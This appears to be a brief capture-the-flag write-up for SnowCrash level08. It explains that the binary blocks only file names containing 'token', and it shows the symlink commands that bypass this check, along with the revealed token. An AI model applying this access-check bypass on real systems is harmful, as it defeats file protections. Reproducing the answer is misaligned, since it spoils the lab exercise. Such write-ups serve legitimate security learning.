the binary in the home folder just checks that the argv[1] file does not contain "token" in its name
therefore; symlinking it to a different route will match and let us open the "token" file


level08@SnowCrash:~$ ln -s ~/token /tmp/test
level08@SnowCrash:~$ ./level08 /tmp/test
quif5eloekouj29ke0vouxean